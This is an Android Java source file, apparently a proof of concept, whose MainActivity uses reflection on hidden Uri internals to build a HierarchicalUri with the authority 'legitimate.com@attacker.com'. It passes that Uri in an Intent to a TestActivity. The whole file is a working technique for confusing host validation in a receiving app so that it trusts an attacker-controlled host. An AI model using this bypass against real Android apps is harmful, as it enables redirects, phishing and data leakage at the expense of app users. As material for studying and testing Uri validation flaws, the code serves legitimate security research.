package com.example.a2;



import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.lang.reflect.Constructor;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri;
        try {
            // Java反射获取类引用
            Class<?> partClass = Class.forName("android.net.Uri$Part");
            Constructor<?> partConstructor = partClass.getDeclaredConstructors()[0];
            partConstructor.setAccessible(true);

            Class<?> pathPartClass = Class.forName("android.net.Uri$PathPart");
            Constructor<?> pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];
            pathPartConstructor.setAccessible(true);

            Class<?> hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");
            Constructor<?> hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];
            hierarchicalUriConstructor.setAccessible(true);

            // 构造HierarchicalUri实例
            Object authority = partConstructor.newInstance("legitimate.com@attacker.com", "legitimate.com@attacker.com");
            Object path = pathPartConstructor.newInstance("", "");
            uri = (Uri) hierarchicalUriConstructor.newInstance("https", authority, path, null, null);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

        Intent intent = new Intent();
        intent.setData(uri);
        intent.setClass(this, TestActivity.class);
        startActivity(intent);
    }
}
